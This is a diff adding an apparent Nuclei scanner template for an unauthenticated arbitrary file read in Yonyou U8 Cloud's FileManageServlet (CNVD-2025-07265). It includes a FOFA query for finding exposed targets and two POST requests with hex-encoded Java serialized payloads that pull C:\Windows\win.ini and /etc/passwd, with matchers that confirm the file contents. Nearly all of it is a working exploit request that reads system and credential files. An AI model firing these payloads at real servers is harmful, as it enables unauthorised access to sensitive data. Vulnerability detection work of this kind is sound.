@@ -1,0 +1,49 @@
+id: yongyouU8-Cloud-FileManageServlet-File-reading-CNVD-2025-07265
+
+info:
+  name: 用友U8 Cloud FileManageServlet 任意文件读取漏洞(CNVD-2025-07265)
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title="U8C"
+    用友U8 Cloud FileManageServlet 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s/0YJbGrJMeM6HNld8z-vXQg
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        POST /service/FileManageServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/octet-stream
+
+        {{hex_decode("aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000374000470617468740012433a5c57696e646f77735c77696e2e696e6974000664734e616d65740003706c6d7400086f7065725479706574000d646f776e6c6f61646c6f63616c78")}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+        condition: and
+      - type: status
+        status: 
+          - 200
+  - raw:
+      - |
+        POST /service/FileManageServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/octet-stream
+
+        {{hex_decode("aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000037400047061746874000b2f6574632f70617373776474000664734e616d65740003706c6d7400086f7065725479706574000d646f776e6c6f61646c6f63616c78")}}
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
